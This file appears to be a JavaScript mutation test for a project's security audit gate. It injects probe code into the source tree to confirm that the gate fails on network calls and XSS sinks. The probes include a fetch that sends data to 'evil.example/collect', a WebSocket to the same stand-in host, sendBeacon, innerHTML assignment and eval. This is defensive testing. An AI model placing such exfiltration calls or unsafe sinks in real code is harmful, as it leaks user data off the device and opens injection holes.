/**
 * security-claims.mjs 的变异验证。
 *
 * 重点是证明「数据不出设备」这条最强承诺真的会被门禁守住 ——
 * 往生产代码里注入一个网络请求，门禁必须变红。
 */
import { readFileSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';

const PROBE = 'src/lib/__net-probe.ts';
const STORAGE = 'src/lib/storage.ts';
const storageOrig = readFileSync(STORAGE, 'utf8');
let checks = 0;
let failures = 0;

function check(name, ok, detail) {
  checks += 1;
  if (ok) console.log('  ✓ ' + name);
  else { failures += 1; console.error('  ✗ ' + name + (detail ? ' — ' + detail : '')); }
}
function runGate() {
  const r = spawnSync(process.execPath, ['scripts/audit/security-claims.mjs'], { encoding: 'utf8' });
  return { code: r.status ?? 1, out: String(r.stdout ?? '') + String(r.stderr ?? '') };
}
function cleanup() {
  try { writeFileSync(PROBE, '', 'utf8'); } catch { /* ignore */ }
  try {
    const fs = require('node:fs');
    if (fs.existsSync(PROBE)) fs.unlinkSync(PROBE);
  } catch { /* ignore */ }
  writeFileSync(STORAGE, storageOrig, 'utf8');
}
process.on('exit', cleanup);

const fs = await import('node:fs');
console.log('');
console.log('变异验证：SECURITY.md 安全声明门禁');
console.log('');

{
  const r = runGate();
  check('基线全绿', r.code === 0, 'exit=' + r.code);
}

/* 变异 1：往生产代码里注入 fetch —— 直接违背「数据不出设备」 */
{
  writeFileSync(PROBE, 'export const send = () => fetch("https://evil.example/collect");\n', 'utf8');
  const r = runGate();
  check('注入 fetch 门禁变红', r.code !== 0, 'exit=' + r.code);
  check('  报出网络请求那条', /网络请求/.test(r.out), r.out.slice(-300));
  check('  指出具体文件', /__net-probe\.ts/.test(r.out), r.out.slice(-300));
  fs.unlinkSync(PROBE);
}

/* 变异 2：注入 WebSocket */
{
  writeFileSync(PROBE, 'export const ws = () => new WebSocket("wss://evil.example");\n', 'utf8');
  const r = runGate();
  check('注入 WebSocket 门禁变红', r.code !== 0, 'exit=' + r.code);
  fs.unlinkSync(PROBE);
}

/* 变异 3：注入 sendBeacon */
{
  writeFileSync(PROBE, 'export const b = () => navigator.sendBeacon("/x", "data");\n', 'utf8');
  const r = runGate();
  check('注入 sendBeacon 门禁变红', r.code !== 0, 'exit=' + r.code);
  fs.unlinkSync(PROBE);
}

/* 变异 4：注入 dangerouslySetInnerHTML（XSS 声明）*/
{
  writeFileSync(PROBE, 'export const El = () => null;\n// dangerouslySetInnerHTML\n', 'utf8');
  const r = runGate();
  check('代码里出现 dangerouslySetInnerHTML 字样时门禁变红', r.code !== 0, 'exit=' + r.code);
  fs.unlinkSync(PROBE);
}

/* 变异 5：注入 .innerHTML = */
{
  writeFileSync(PROBE, 'export const f = (el: HTMLElement) => { el.innerHTML = "<b>x</b>"; };\n', 'utf8');
  const r = runGate();
  check('注入 .innerHTML 赋值门禁变红', r.code !== 0, 'exit=' + r.code);
  fs.unlinkSync(PROBE);
}

/* 变异 6：注入 eval */
{
  writeFileSync(PROBE, 'export const e = (s: string) => eval(s);\n', 'utf8');
  const r = runGate();
  check('注入 eval 门禁变红', r.code !== 0, 'exit=' + r.code);
  fs.unlinkSync(PROBE);
}

/* 变异 7：测试文件里的 fetch 不应误报（测试要 mock 网络，合法）*/
{
  writeFileSync('src/lib/__net-probe.test.ts', 'export const t = () => fetch("https://example.com");\n', 'utf8');
  const r = runGate();
  check('测试文件里的 fetch 不误报（排除 *.test.*）', r.code === 0, 'exit=' + r.code + ' ' + r.out.slice(-200));
  fs.unlinkSync('src/lib/__net-probe.test.ts');
}

{
  const r = runGate();
  check('恢复后全绿', r.code === 0, 'exit=' + r.code);
  check('storage.ts 逐字节还原', readFileSync(STORAGE, 'utf8') === storageOrig);
  check('探针文件已清理', !fs.existsSync(PROBE));
}

console.log('');
if (failures > 0) { console.error('✗ ' + failures + ' / ' + checks + ' 项失败'); process.exit(1); }
console.log('✓ ' + checks + ' 项：「数据不出设备」与 XSS 的三条防线都真的会红');
